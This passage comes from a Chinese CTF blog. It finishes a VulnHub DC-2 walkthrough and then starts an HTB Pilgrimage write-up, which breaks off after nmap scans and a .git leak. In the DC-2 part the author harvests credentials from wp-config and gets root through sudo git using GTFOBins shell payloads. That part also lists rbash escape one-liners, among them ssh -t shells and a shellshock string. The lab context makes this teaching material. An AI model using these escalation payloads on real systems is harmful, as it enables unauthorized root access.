里是有常用的程序的。那接下来可以把常用的一些路径放入环境变量中，我看了看 kali 中的环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>                                          <br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games<br></code></pre></td></tr></table></figure><p>按照 kali 中的环境变量将其写入靶机的环境变量中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:<span class="hljs-variable">$PATH</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/tom/usr/bin<br></code></pre></td></tr></table></figure><p>折腾了半天总算把 shell 完善了。尝试 <code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo -l                           <br>[sudo] password <span class="hljs-keyword">for</span> tom:                                                                                            <br>Sorry, user tom may not run sudo on DC-2.<br></code></pre></td></tr></table></figure><h2 id="信息收集与用户切换"><a href="#信息收集与用户切换" class="headerlink" title="信息收集与用户切换"></a>信息收集与用户切换</h2><p>没有权限，进入 home 目录发现还有个 jerry 用户，感觉像是在玩猫和老鼠的梗，除此之外如果仔细翻看登录后的 wordpress 后台的话，可以在用户信息里看到用户的全程就是 <code>tom cat</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> /home/jerry<br>$ <span class="hljs-built_in">ls</span> -liah<br>total 28K<br>128057 drwxr-xr-x 2 jerry jerry 4.0K Mar 21  2019 .<br>  1558 drwxr-xr-x 4 root  root  4.0K Mar 21  2019 ..<br>140336 -rw------- 1 jerry jerry  270 Jul 10 04:47 .bash_history<br>128060 -rw-r--r-- 1 jerry jerry  220 Mar 21  2019 .bash_logout<br>128058 -rw-r--r-- 1 jerry jerry 3.5K Mar 21  2019 .bashrc<br>140348 -rw-r--r-- 1 jerry jerry  223 Mar 21  2019 flag4.txt<br>128059 -rw-r--r-- 1 jerry jerry  675 Mar 21  2019 .profile<br>$ <span class="hljs-built_in">cat</span> flag4.txt<br>Good to see that you<span class="hljs-string">&#x27;ve made it this far - but you&#x27;</span>re not home yet. <br><br>You still need to get the final flag (the only flag that really counts!!!).  <br><br>No hints here - you<span class="hljs-string">&#x27;re on your own now.  :-)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Go on - git outta here!!!!</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>不是很能理解暗示的言外之意，一方面说没有暗示，一方面最后一句又显得很奇怪。wordpress 后台的话，应该能在 config 文件里找到数据库的密码，考虑密码碰撞或者数据库信息泄露或者 mysql 提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> /var/www/html<br>$ <span class="hljs-built_in">ls</span> -liah<br>total 200K<br>27872 drwxr-xr-x  5 1006 1006 4.0K Mar 21  2019 .<br>26852 drwxr-xr-x  4 root root 4.0K Mar 21  2019 ..<br>32857 -rw-r--r--  1 1006 1006  418 Sep 24  2013 index.php<br>32860 -rw-r--r--  1 1006 1006  20K Jan 23  2018 license.txt<br>32859 -rw-r--r--  1 1006 1006 7.3K Oct 31  2017 readme.html<br>32861 -rw-r--r--  1 1006 1006 5.4K Sep 27  2016 wp-activate.php<br>28084 drwxr-xr-x  9 1006 1006 4.0K Apr  4  2018 wp-admin<br>32867 -rw-r--r--  1 1006 1006  364 Dec 19  2015 wp-blog-header.php<br>32856 -rw-r--r--  1 1006 1006 1.6K Aug 29  2016 wp-comments-post.php<br>33614 -rw-r--r--  1 root root 3.2K Mar 21  2019 wp-config.php<br>32862 -rw-r--r--  1 1006 1006 2.8K Dec 16  2015 wp-config-sample.php<br>32863 drwxr-xr-x  5 1006 1006 4.0K Apr  4  2018 wp-content<br>27915 -rw-r--r--  1 1006 1006 3.3K May 24  2015 wp-cron.php<br>32868 drwxr-xr-x 18 1006 1006  12K Apr  4  2018 wp-includes<br>33613 -rw-r--r--  1 1006 1006 2.4K Nov 20  2016 wp-links-opml.php<br>28080 -rw-r--r--  1 1006 1006 3.3K Oct 24  2016 wp-load.php<br>27914 -rw-r--r--  1 1006 1006  34K Apr  3  2018 wp-login.php<br>32866 -rw-r--r--  1 1006 1006 7.9K Jan 11  2017 wp-mail.php<br>32865 -rw-r--r--  1 1006 1006  16K Apr  6  2017 wp-settings.php<br>33612 -rw-r--r--  1 1006 1006  30K Oct 19  2016 wp-signup.php<br>32858 -rw-r--r--  1 1006 1006 4.5K Oct 14  2016 wp-trackback.php<br>28008 -rw-r--r--  1 1006 1006 3.0K Aug 31  2016 xmlrpc.php<br></code></pre></td></tr></table></figure><p>确实有 wp-config 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> wp-config.php<br>&lt;?php<br>define(<span class="hljs-string">&#x27;WP_HOME&#x27;</span>,<span class="hljs-string">&#x27;http://dc-2&#x27;</span>);<br>define(<span class="hljs-string">&#x27;WP_SITEURL&#x27;</span>,<span class="hljs-string">&#x27;http://dc-2&#x27;</span>);<br><br>/**<br> * The base configuration <span class="hljs-keyword">for</span> WordPress<br> *<br> * The wp-config.php creation script uses this file during the<br> * installation. You don<span class="hljs-string">&#x27;t have to use the web site, you can</span><br><span class="hljs-string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * This file contains the following configurations:</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * * MySQL settings</span><br><span class="hljs-string"> * * Secret keys</span><br><span class="hljs-string"> * * Database table prefix</span><br><span class="hljs-string"> * * ABSPATH</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define(&#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>wordpressdb<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define(&#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>wpadmin<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define(&#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>4uTiLL<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL hostname */</span><br><span class="hljs-string">define(&#x27;</span>DB_HOST<span class="hljs-string">&#x27;, &#x27;</span>localhost<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-string">define(&#x27;</span>DB_CHARSET<span class="hljs-string">&#x27;, &#x27;</span>utf8<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** The Database Collate type. Don&#x27;</span>t change this <span class="hljs-keyword">if</span> <span class="hljs-keyword">in</span> doubt. */<br>define(<span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>/**<span class="hljs-comment">#@+</span><br> * Authentication Unique Keys and Salts.<br> *<br> * Change these to different unique phrases!<br> * You can generate these using the &#123;@<span class="hljs-built_in">link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;<br> * You can change these at any point <span class="hljs-keyword">in</span> time to invalidate all existing cookies. This will force all <span class="hljs-built_in">users</span> to have to <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> again.<br> *<br> * @since 2.6.0<br> */<br><br>define(<span class="hljs-string">&#x27;AUTH_KEY&#x27;</span>,         <span class="hljs-string">&#x27;,dl5^nwxT:/et,y6K$f=q+X|nk47g=@spk&lt;w?-&gt;-DsKODlCXNmNtmH]gA&#123;xoBl%x&#x27;</span>);<br>define(<span class="hljs-string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="hljs-string">&#x27;!]B|&amp;_X _&#123;|rp 5fY6UU+fU$I6b!kvKa&#123;r3S|xs.]:WWm&gt;:&#123;,?M`qq8TwKZmx T|&#x27;</span>);<br>define(<span class="hljs-string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="hljs-string">&#x27;a5:jar&#123;YEiPSA&#123;sq[4KO-|OZk=Sp^f+3&#125;8bZ5zAb0skMj)CAC1W&#125;SH&#125;vx(nU2NX]&#x27;</span>);<br>define(<span class="hljs-string">&#x27;NONCE_KEY&#x27;</span>,        <span class="hljs-string">&#x27;7PhZ~$,c$xng&#123;U|Kv`-%R?&gt;T+9,|M_h!dXY&#125;yk;|:ZX|;M:ZL|DDoUR[n)h4|NY%&#x27;</span>);<br>define(<span class="hljs-string">&#x27;AUTH_SALT&#x27;</span>,        <span class="hljs-string">&#x27;(&#123;(&lt;.wWSJmt|&lt;OY@%tg(!kwk4]1U.%&lt;wL+zA0F]ZQn|IHs%W&gt;`Fu-FtJ~j;Fb&gt;Zz&#x27;</span>);<br>define(<span class="hljs-string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="hljs-string">&#x27;@(xD@ W~&gt;EH7Pd^i!9(-V1)%@P[6=WQ0s6SP,otK.rKE4WWhF)?DK0wM1LOR#E|x&#x27;</span>);<br>define(<span class="hljs-string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="hljs-string">&#x27;H@?@Gqd&gt;Cfuhbr2&gt;U4RNoVpA3&#123;+~_`o@b,2s)uwl*|MG GB^2tx~Vrc^w60Rv`h(&#x27;</span>);<br>define(<span class="hljs-string">&#x27;NONCE_SALT&#x27;</span>,       <span class="hljs-string">&#x27;x~|2pyiJ^j!L=dBM&lt;S$|U/)pE1HN|&#123;o,Yu-~[NT_VaEI7Go5uNaqNzBs1aA063a%&#x27;</span>);<br><br><br>/**<span class="hljs-comment">#@-*/</span><br><br>/**<br> * WordPress Database Table prefix.<br> *<br> * You can have multiple installations <span class="hljs-keyword">in</span> one database <span class="hljs-keyword">if</span> you give each<br> * a unique prefix. Only numbers, letters, and underscores please!<br> */<br><span class="hljs-variable">$table_prefix</span>  = <span class="hljs-string">&#x27;wp_&#x27;</span>;<br><br>/**<br> * For developers: WordPress debugging mode.<br> *<br> * Change this to <span class="hljs-literal">true</span> to <span class="hljs-built_in">enable</span> the display of notices during development.<br> * It is strongly recommended that plugin and theme developers use WP_DEBUG<br> * <span class="hljs-keyword">in</span> their development environments.<br> *<br> * For information on other constants that can be used <span class="hljs-keyword">for</span> debugging,<br> * visit the Codex.<br> *<br> * @<span class="hljs-built_in">link</span> https://codex.wordpress.org/Debugging_in_WordPress<br> */<br>define(<span class="hljs-string">&#x27;WP_DEBUG&#x27;</span>, <span class="hljs-literal">false</span>);<br><br>/* That\<span class="hljs-string">&#x27;s all, stop editing! Happy blogging. */</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Absolute path to the WordPress directory. */</span><br><span class="hljs-string">if ( !defined(&#x27;</span>ABSPATH<span class="hljs-string">&#x27;) )</span><br><span class="hljs-string">        define(&#x27;</span>ABSPATH<span class="hljs-string">&#x27;, dirname(__FILE__) . &#x27;</span>/<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Sets up WordPress vars and included files. */</span><br><span class="hljs-string">require_once(ABSPATH . &#x27;</span>wp-settings.php<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define( &#x27;</span>WP_AUTO_UPDATE_CORE<span class="hljs-string">&#x27;, false );</span><br></code></pre></td></tr></table></figure><p>拿到 <code>wpadmin:4uTiLL</code>，尝试登录数据库后发现用户密码都经过了哈希，没法碰撞 admin 的密码。想 MySQL 提权的思路发现，对写入目录是有限制的，不满足提权的条件，那就只能试试密码碰撞了</p><p>使用 <code>4uTiLL</code>, <code>parturient</code>, <code>adipiscing</code> 尝试登录 root，均失败。</p><p>尝试登录 jerry ，<code>adipiscing</code> 登录成功</p><h2 id="sudo-git-提权"><a href="#sudo-git-提权" class="headerlink" title="sudo git 提权"></a>sudo git 提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jerry@DC-2:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> jerry on DC-2:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git<br></code></pre></td></tr></table></figure><p>发现可以不使用密码以 root 权限运行 git 命令，正好对应了 flag4.txt 中的暗示。接着按照 gtfobins 的手法来提权</p><p><img src="/pic/f00205d27ae218d56e31c4841d0dabe0_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">jerry@DC-2:~$ sudo PAGER=<span class="hljs-string">&#x27;sh -c &quot;exec sh 0&lt;&amp;1&quot;&#x27;</span> git -p <span class="hljs-built_in">help</span><br>sudo: sorry, you are not allowed to <span class="hljs-built_in">set</span> the following environment variables: PAGER<br>jerry@DC-2:~$ sudo PAGER=<span class="hljs-string">&#x27;sh -c &quot;exec sh 0&lt;&amp;1&quot;&#x27;</span> /usr/bin/git -p <span class="hljs-built_in">help</span><br>sudo: sorry, you are not allowed to <span class="hljs-built_in">set</span> the following environment variables: PAGER<br><br></code></pre></td></tr></table></figure><p>方法 a 失败，尝试方法 b</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">jerry@DC-2:~$ sudo git -p <span class="hljs-built_in">help</span> config<br>!/bin/sh<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:00:39:e2 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.124/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe00:39e2/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-comment"># uname -a</span><br>Linux DC-2 3.16.0-4-586 <span class="hljs-comment">#1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux</span><br><br></code></pre></td></tr></table></figure><p>确定是目标靶机，最后拿个 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls</span><br>final-flag.txt<br><span class="hljs-comment"># cat final-flag.txt</span><br> __    __     _ _       _                    _ <br>/ / /\ \ \___| | |   __| | ___  _ __   ___  / \<br>\ \/  \/ / _ \ | |  / _` |/ _ \|  _ \ / _ \/  /<br> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ <br>  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   <br><br><br>Congratulatons!!!<br><br>A special thanks to all those <span class="hljs-built_in">who</span> sent me tweets<br>and provided me with feedback - it<span class="hljs-string">&#x27;s all greatly</span><br><span class="hljs-string">appreciated.</span><br><span class="hljs-string"></span><br><span class="hljs-string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="总结复盘"><a href="#总结复盘" class="headerlink" title="总结复盘"></a>总结复盘</h2><p>这台靶机因为有提示，所以打起来没那么难，比如关于自己收集字典进行爆破，如果没有提示的话可能会卡很久，或者想办法用 wordpress 比较新的漏洞打进去。再就是 rbash 实际上是第一次遇到，虽然不难，但是处理起来依然消磨了不少时间，此外关于用户名和密码的重用，自己的敏感度还是不够高，关于渗透优先级的构建还是缺乏自己的思路。除此之外，这台靶机我尝试了很多内核提权的方法都没有成功</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="rbash-绕过-1"><a href="#rbash-绕过-1" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h3><p>在一个 rbash 的 shell 中，我们最开始要做的是对可用命令进行尝试，确定哪些命令是可用的，哪些命令是被限制的，这样我们才能更方便地绕过 rbash，接下来是一些绕过方法的总结，参考的文章会放在最后</p><h4 id="环境侦察"><a href="#环境侦察" class="headerlink" title="环境侦察"></a>环境侦察</h4><ul><li>查看哪些命令可用</li><li>查看操作符 <code>&gt;</code>, <code>&gt;&gt;</code>, <code>|</code></li><li>查看可用的编程语言环境</li><li><code>sudo -l</code> 查看可用 root 权限运行的命令</li><li>查看 SUID 的命令或文件</li><li><code>echo $SHELL</code> 确定 bash 环境</li><li><code>echo $PATH</code> 查看环境变量</li></ul><h4 id="常见的-exploit"><a href="#常见的-exploit" class="headerlink" title="常见的 exploit"></a>常见的 exploit</h4><ul><li><code>/bin/bash</code> or <code>/bin/sh</code></li><li><code>cp /bin/bash ./</code> or <code>cp /bin/sh</code></li><li><code>ftp</code>, <code>gdb</code>, <code>less</code>, <code>vim</code> 可用 <code>!/bin/bash</code> or <code>/bin/sh</code></li><li>还有一些可用在 gtfobins 中查看如何通过命令实现新启bash</li><li>编程语言新启 bash</li><li>ssh 手法<ul><li><code>ssh username@IP - t &quot;/bin/sh&quot;</code> or <code>&quot;/bin/bash&quot;</code></li><li><code>ssh username@IP -t &quot;bash --noprofile&quot;</code></li><li><code>ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot;</code> (shellshock)</li><li><code>ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1</code> (SUID)</li><li><code>pico -s &quot;/bin/bash&quot;</code> then you can write <code>/bin/bash</code> and then CTRL + T</li></ul></li><li>直接修改环境变量 <code>export PATH=$PATH:/bin/:/usr/bin:$PATH</code></li><li>有时候 <code>!sh</code> 也有效果</li></ul>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pilgrimage 靶机</title>
    <link href="/2023/07/e8652c909b79.html"/>
    <url>/2023/07/e8652c909b79.html</url>
    
    <content type="html"><![CDATA[<h1 id="Pilgrimage-靶机"><a href="#Pilgrimage-靶机" class="headerlink" title="Pilgrimage 靶机"></a>Pilgrimage 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(pytool)─(i3eg1nner㉿minilite)-[~/…/GitTools/Dumper/clone/assets]<br>└─$ sudo nmap --min-rate 10000 -p- 10.10.11.219<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 01:34 EDT<br>Warning: 10.10.11.219 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> pilgrimage.htb (10.10.11.219)<br>Host is up (0.14s latency).<br>Not shown: 63441 closed tcp ports (reset), 2092 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 33.63 seconds<br></code></pre></td></tr></table></figure><p>只开放了两个端口 22 和 80</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(pytool)─(i3eg1nner㉿minilite)-[~/…/GitTools/Dumper/clone/assets]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.219<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 01:35 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> pilgrimage.htb (10.10.11.219)<br>Host is up (0.0031s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)<br>| ssh-hostkey:<br>|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)<br>|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)<br>|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)<br>80/tcp open  http    nginx 1.18.0<br>| http-git:<br>|   10.10.11.219:80/.git/<br>|     Git repository found!<br>|     Repository description: Unnamed repository; edit this file <span class="hljs-string">&#x27;description&#x27;</span> to name the...<br>|_    Last commit message: <br>image shrinking service initial commit. <span class="hljs-comment"># Please ...</span><br>| http-cookie-flags:<br>|   /:<br>|     PHPSESSID:<br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: nginx/1.18.0<br>|_http-title: Pilgrimage - Shrink Your Images<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.85 seconds<br></code></pre></td></tr></table></figure><h2 id="git-泄露"><a href="#git-泄露" class="headerlink" title=".git 泄露"></a>.git 泄露</h2><p>80 端口下存在 <code>.git</code> 泄露，或许是个可以利用的点，Debian 操作系统，将域名与 ip 的映射写入 hosts 文件后，使用浏览器访问，同时进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 